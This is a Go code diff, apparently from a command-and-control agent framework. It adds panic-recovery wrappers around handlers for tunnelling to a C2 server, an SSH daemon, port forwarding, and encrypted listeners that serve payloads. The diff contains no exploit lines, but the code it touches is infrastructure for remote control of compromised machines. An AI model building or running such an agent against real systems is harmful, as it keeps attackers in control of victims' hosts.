@@ -143,7 +143,14 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 	if useKCP {
 		targetAddrWithPort = fmt.Sprintf("127.0.0.1:%s", kcpListenPort)
 		kcpServerAddr := fmt.Sprintf("%s:%s", addr, common.RuntimeConfig.KCPServerPort)
-		go transport.KCPTunClient(kcpServerAddr, kcpListenPort, common.RuntimeConfig.Password, def.MagicString, ctx, cancel)
+		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("KCPTunClient panic: %v\n%s", r, util.CallStack())
+				}
+			}()
+			transport.KCPTunClient(kcpServerAddr, kcpListenPort, common.RuntimeConfig.Password, def.MagicString, ctx, cancel)
+		}()
 		// wait for KCP client to start
 		for i := 0; i < 20; i++ {
 			if netutil.IsPortOpen("127.0.0.1", kcpListenPort) {
@@ -178,6 +185,12 @@ func runSSHD(cmd *cobra.Command, args []string) {
 	logging.Printf("Got sshd request: %v", args)
 	errChan := make(chan error)
 	go func() {
+		defer func() {
+			if r := recover(); r != nil {
+				logging.Errorf("SSHD panic: %v\n%s", r, util.CallStack())
+				errChan <- fmt.Errorf("SSHD panic: %v", r)
+			}
+		}()
 		errChan <- ssh.SSHD(shell, port, sshdArgs)
 	}()
 	for !netutil.IsPortOpen("127.0.0.1", port) {
@@ -237,10 +250,22 @@ func runPortFwd(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error: port mapping not found\n")
 	case "reverse":
 		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("PortFwd reverse panic: %v\n%s", r, util.CallStack())
+					errChan <- fmt.Errorf("PortFwd panic: %v", r)
+				}
+			}()
 			errChan <- modules.PortFwd(to, sessionID, "tcp", true, 0)
 		}()
 	default:
 		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("PortFwd panic: %v\n%s", r, util.CallStack())
+					errChan <- fmt.Errorf("PortFwd panic: %v", r)
+				}
+			}()
 			errChan <- modules.PortFwd(to, sessionID, operation, false, timeout)
 		}()
 	}
@@ -325,14 +350,32 @@ func runListener(cmd *cobra.Command, args []string) {
 	switch listenerType {
 	case "http_aes_compressed":
 		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("HTTPAESCompressedListener panic: %v\n%s", r, util.CallStack())
+					errChan <- fmt.Errorf("Listener panic: %v", r)
+				}
+			}()
 			errChan <- listener.HTTPAESCompressedListener(payload, port, passphrase, compression == "on")
 		}()
 	case "tcp_aes_compressed":
 		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("TCPAESCompressedListener panic: %v\n%s", r, util.CallStack())
+					errChan <- fmt.Errorf("Listener panic: %v", r)
+				}
+			}()
 			errChan <- listener.TCPAESCompressedListener(payload, port, passphrase, compression == "on")
 		}()
 	case "udp_aes_compressed":
 		go func() {
+			defer func() {
+				if r := recover(); r != nil {
+					logging.Errorf("UDPAESCompressedListener panic: %v\n%s", r, util.CallStack())
+					errChan <- fmt.Errorf("Listener panic: %v", r)
+				}
+			}()
 			errChan <- listener.UDPAESCompressedListener(payload, port, passphrase, compression == "on")
 		}()
 	default:
